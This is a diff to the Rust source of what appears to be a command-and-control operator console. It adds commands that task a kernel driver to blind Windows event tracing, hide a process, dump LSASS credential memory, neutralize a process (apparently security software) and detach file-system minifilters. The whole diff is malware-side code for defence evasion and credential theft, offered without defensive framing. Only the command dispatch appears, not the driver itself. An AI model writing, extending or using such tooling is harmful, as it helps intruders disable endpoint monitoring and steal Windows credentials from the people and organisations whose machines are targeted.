@@ -1974,6 +1974,30 @@ impl App {
                 });
                 self.log(&format!("[{}] tasked exit", short(&s.id)), Level::Warn);
             }
+            "/driver-status" => self.send(Cmd::KernelStatus),
+            "/blind-etw" => self.send(Cmd::KernelBlindEtw),
+            "/hide" => {
+                let pid: u32 = match args.trim().parse() {
+                    Ok(p) => p,
+                    Err(_) => { self.log("usage: /hide <pid>", Level::Warn); return; }
+                };
+                self.send(Cmd::KernelHide { pid });
+            }
+            "/dump-lsass" => {
+                let pid: u32 = match args.trim().parse() {
+                    Ok(p) => p,
+                    Err(_) => { self.log("usage: /dump-lsass <pid>", Level::Warn); return; }
+                };
+                self.send(Cmd::KernelDumpLsass { pid });
+            }
+            "/neutralize" => {
+                let pid: u32 = match args.trim().parse() {
+                    Ok(p) => p,
+                    Err(_) => { self.log("usage: /neutralize <pid>", Level::Warn); return; }
+                };
+                self.send(Cmd::KernelNeutralize { pid });
+            }
+            "/detach-mf" => self.send(Cmd::KernelDetachMinifilter),
             other => self.log(
                 &format!("! unknown command {other} — try /help",),
                 Level::Err,
